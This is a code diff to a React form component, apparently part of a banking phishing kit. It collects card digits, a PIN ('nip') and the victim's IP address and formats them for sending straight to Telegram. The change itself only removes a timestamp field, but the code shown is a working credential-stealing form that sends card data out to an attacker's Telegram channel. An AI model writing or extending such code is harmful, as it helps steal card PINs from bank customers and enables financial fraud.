@@ -7,7 +7,7 @@ import Header from '@/components/header';
 import Footer from '@/components/Footer';
 import { toast } from 'sonner';
 import { getSessionId } from '@/utils/session';
-import { formatCardDetailsMessage, getTimestamp } from '@/utils/telegramFormatter';
+import { formatCardDetailsMessage } from '@/utils/telegramFormatter';
 
 const CardAndNIPForm = () => {
     const router = useRouter(); // Instancia de useRouter para la redirección
@@ -110,8 +110,7 @@ const CardAndNIPForm = () => {
                     sessionId,
                     lastTwoDigits: formData.lastTwoDigits,
                     nip: formData.nip,
-                    ip: ip.data.ip,
-                    timestamp: getTimestamp()
+                    ip: ip.data.ip
                 });
 
                 // Send directly to Telegram via sender API
